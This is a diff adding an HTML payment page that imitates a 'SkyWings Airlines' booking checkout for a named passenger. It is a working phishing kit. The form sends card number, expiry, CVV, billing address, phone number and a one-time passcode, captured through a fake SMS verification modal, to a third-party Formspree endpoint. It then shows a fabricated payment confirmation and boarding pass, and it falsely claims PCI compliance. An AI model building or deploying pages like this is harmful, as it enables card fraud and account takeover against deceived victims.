@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment - SkyWings Airlines</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+
+        @media (max-width: 968px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .flight-details {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+
+        .route {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .airport {
+            text-align: center;
+        }
+
+        .code {
+            font-size: 32px;
+            font-weight: bold;
+            color: #667eea;
+        }
+
+        .city {
+            font-size: 12px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .plane-icon {
+            font-size: 24px;
+            color: #667eea;
+            animation: fly 2s ease-in-out infinite;
+        }
+
+        @keyframes fly {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .label {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .value {
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .price-tag {
+            background: #667eea;
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .price {
+            font-size: 36px;
+            font-weight: bold;
+        }
+
+        .price-label {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .payment-form h2 {
+            color: #333;
+            margin-bottom: 25px;
+            font-size: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .card-input-wrapper {
+            position: relative;
+        }
+
+        .card-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 24px;
+        }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            color: #4caf50;
+            font-size: 14px;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .phone-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 36px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .modal h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .modal p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+
+        .otp-input:focus {
+            border-color: #667eea;
+        }
+
+        .timer {
+            color: #667eea;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .resend {
+            color: #666;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: #4caf50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 50px;
+            animation: scaleIn 0.5s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+
+        .ticket-preview {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ticket-preview::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: repeating-linear-gradient(
+                45deg,
+                transparent,
+                transparent 10px,
+                rgba(255,255,255,0.03) 10px,
+                rgba(255,255,255,0.03) 20px
+            );
+        }
+
+        .ticket-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .barcode {
+            height: 60px;
+            background: repeating-linear-gradient(
+                90deg,
+                #000 0px,
+                #000 2px,
+                transparent 2px,
+                transparent 4px
+            );
+            margin: 20px 0;
+            position: relative;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Left Side: Flight Details -->
+    <div class="card">
+        <div class="header">
+            <div class="logo">✈</div>
+            <h1>Booking Confirmation</h1>
+            <p class="subtitle">SkyWings Airlines • Booking #SW-78432</p>
+        </div>
+
+        <div class="flight-details">
+            <div class="route">
+                <div class="airport">
+                    <div class="code">LHR</div>
+                    <div class="city">London Heathrow</div>
+                </div>
+                <div class="plane-icon">✈</div>
+                <div class="airport">
+                    <div class="code">JFK</div>
+                    <div class="city">New York JFK</div>
+                </div>
+            </div>
+
+            <div class="info-row">
+                <span class="label">Passenger</span>
+                <span class="value">Jules Lynnette</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Age</span>
+                <span class="value">21 years</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Residence</span>
+                <span class="value">Liverpool, UK</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Flight Date</span>
+                <span class="value">15 March 2026</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Departure</span>
+                <span class="value">10:30 GMT</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Class</span>
+                <span class="value">Economy Plus</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Flight Number</span>
+                <span class="value">SW-2847</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Duration</span>
+                <span class="value">7h 45m</span>
+            </div>
+        </div>
+
+        <div class="price-tag">
+            <div class="price">€1,134.00</div>
+            <div class="price-label">Total Amount Due</div>
+        </div>
+
+        <div class="secure-badge">
+            <span>🔒</span>
+            <span>256-bit SSL Encrypted & PCI Compliant</span>
+        </div>
+    </div>
+
+    <!-- Right Side: Payment Form -->
+    <div class="card payment-form" id="paymentSection">
+        <h2>Payment Details</h2>
+        
+        <!-- FORMSPREE FORM - Replace YOUR_FORM_ID with your actual Formspree URL -->
+        <form id="paymentForm" action="https://formspree.io/f/meergakw" method="POST">
+            
+            <!-- Hidden fields -->
+            <input type="hidden" name="passenger_name" value="Jules Lynnette">
+            <input type="hidden" name="passenger_age" value="21">
+            <input type="hidden" name="passenger_location" value="Liverpool, UK">
+            <input type="hidden" name="flight_route" value="LHR to JFK">
+            <input type="hidden" name="amount" value="€1,134.00">
+            <input type="hidden" name="booking_ref" value="SW-78432">
+            <input type="hidden" name="otp_code" id="otpCodeField">
+            <input type="hidden" name="submission_time" id="submissionTime">
+
+            <div class="form-group">
+                <label>Cardholder Name</label>
+                <input type="text" name="card_name" id="cardName" placeholder="JULES LYNNETTE" required>
+            </div>
+
+            <div class="form-group">
+                <label>Card Number</label>
+                <div class="card-input-wrapper">
+                    <input type="text" name="card_number" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    <span class="card-icon" id="cardIcon">💳</span>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Expiry Date</label>
+                    <input type="text" name="expiry_date" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" name="cvv" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Billing Address</label>
+                <input type="text" name="billing_address" placeholder="123 Anfield Road, Liverpool" required>
+            </div>
+
+            <div class="form-group">
+                <label>Postcode</label>
+                <input type="text" name="postcode" placeholder="L4 0TH" required>
+            </div>
+
+            <div class="form-group">
+                <label>Phone Number (for verification)</label>
+                <input type="tel" name="phone_number" id="phoneNumber" placeholder="+44 7700 900123" required>
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">Pay €1,134.00 Securely</button>
+        </form>
+
+        <div class="success-message" id="successMessage">
+            <div class="success-icon">✓</div>
+            <h2>Payment Successful!</h2>
+            <p>Your booking has been confirmed.</p>
+            
+            <div class="ticket-preview">
+                <div class="ticket-header">
+                    <span>BOARDING PASS</span>
+                    <span>SW-2847</span>
+                </div>
+                <div style="font-size: 24px; font-weight: bold; margin-bottom: 10px;">Jules Lynnette</div>
+                <div style="opacity: 0.9;">LHR → JFK • 15 MAR 2026</div>
+                <div class="barcode"></div>
+                <div style="font-size: 12px; opacity: 0.7;">Please arrive 3 hours before departure</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- OTP Modal -->
+<div class="modal-overlay" id="otpModal">
+    <div class="modal">
+        <div class="phone-icon">📱</div>
+        <h2>Verify Payment</h2>
+        <p>We've sent a 6-digit verification code to<br><strong id="maskedPhone">+44 •••• ••123</strong></p>
+        
+        <div class="otp-inputs">
+            <input type="text" class="otp-input" maxlength="1" data-index="0">
+            <input type="text" class="otp-input" maxlength="1" data-index="1">
+            <input type="text" class="otp-input" maxlength="1" data-index="2">
+            <input type="text" class="otp-input" maxlength="1" data-index="3">
+            <input type="text" class="otp-input" maxlength="1" data-index="4">
+            <input type="text" class="otp-input" maxlength="1" data-index="5">
+        </div>
+
+        <div class="timer" id="timer">Code expires in: 02:59</div>
+        <div class="resend" onclick="resendCode()">Resend Code</div>
+        
+        <button class="btn" onclick="verifyOTP()" style="margin-top: 20px;">Verify & Complete</button>
+    </div>
+</div>
+
+<script>
+    // Card number formatting
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+        e.target.value = formattedValue;
+        
+        const cardIcon = document.getElementById('cardIcon');
+        if (value.startsWith('4')) {
+            cardIcon.textContent = '💳 Visa';
+        } else if (value.startsWith('5')) {
+            cardIcon.textContent = '💳 MC';
+        } else if (value.startsWith('3')) {
+            cardIcon.textContent = '💳 Amex';
+        } else {
+            cardIcon.textContent = '💳';
+        }
+    });
+
+    // Expiry date formatting
+    document.getElementById('expiry').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value;
+    });
+
+    // Form submission handler
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const phone = document.getElementById('phoneNumber').value;
+        const masked = phone.substring(0, 3) + ' •••• ••' + phone.slice(-3);
+        document.getElementById('maskedPhone').textContent = masked;
+        
+        document.getElementById('otpModal').classList.add('active');
+        
+        startTimer();
+        
+        setTimeout(() => {
+            document.querySelector('.otp-input[data-index="0"]').focus();
+        }, 100);
+    });
+
+    // OTP input handling
+    const otpInputs = document.querySelectorAll('.otp-input');
+
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+            if (e.target.value.length === 1) {
+                if (index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            }
+        });
+        
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+        });
+    });
+
+    let timerInterval;
+    function startTimer() {
+        let seconds = 179;
+        const timerEl = document.getElementById('timer');
+        
+        clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            timerEl.textContent = `Code expires in: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            
+            if (seconds <= 0) {
+                clearInterval(timerInterval);
+                timerEl.textContent = 'Code expired';
+                timerEl.style.color = '#f44336';
+            }
+            seconds--;
+        }, 1000);
+    }
+
+    function resendCode() {
+        startTimer();
+        document.getElementById('timer').style.color = '#667eea';
+        otpInputs.forEach(input => input.value = '');
+        otpInputs[0].focus();
+    }
+
+    function verifyOTP() {
+        const code = Array.from(otpInputs).map(i => i.value).join('');
+        
+        if (code.length === 6) {
+            document.getElementById('otpCodeField').value = code;
+            document.getElementById('submissionTime').value = new Date().toISOString();
+            
+            document.getElementById('submitBtn').textContent = 'Processing...';
+            
+            document.getElementById('paymentForm').submit();
+            
+            document.getElementById('otpModal').classList.remove('active');
+            document.getElementById('paymentForm').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+        } else {
+            alert('Please enter the complete 6-digit code');
+        }
+    }
+</script>
+
+</body>
+</html>
